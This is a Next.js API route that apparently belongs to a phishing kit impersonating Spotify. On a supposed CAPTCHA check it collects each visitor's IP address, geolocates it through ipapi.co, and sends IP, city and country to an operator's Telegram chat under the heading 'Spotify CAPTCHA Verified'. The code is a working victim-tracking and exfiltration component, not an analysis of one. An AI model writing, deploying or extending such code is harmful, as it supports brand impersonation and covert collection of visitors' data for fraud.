import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    // Get IP address from request headers
    const forwarded = request.headers.get("x-forwarded-for")
    const ip = forwarded ? forwarded.split(",")[0].trim() : request.headers.get("x-real-ip") || "Unknown"

    // Get geolocation data from IP
    let city = "Unknown"
    let country = "Unknown"

    try {
      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`)
      if (geoResponse.ok) {
        const geoData = await geoResponse.json()
        city = geoData.city && geoData.city.trim() ? geoData.city : "Unknown"
        country = geoData.country_name && geoData.country_name.trim() ? geoData.country_name : "Unknown"
      }
    } catch (geoError) {
      console.error("Geolocation error:", geoError)
    }

    // Send to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!botToken || !chatId) {
      return NextResponse.json({ error: "Telegram credentials not configured" }, { status: 500 })
    }

    const message =
      `✅ *Spotify CAPTCHA Verified*\n\n` + `📍 *City:* ${city}\n` + `🌍 *Country:* ${country}\n` + `🌐 *IP:* ${ip}`

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`

    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (!telegramResponse.ok) {
      throw new Error("Failed to send Telegram message")
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending captcha verification notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
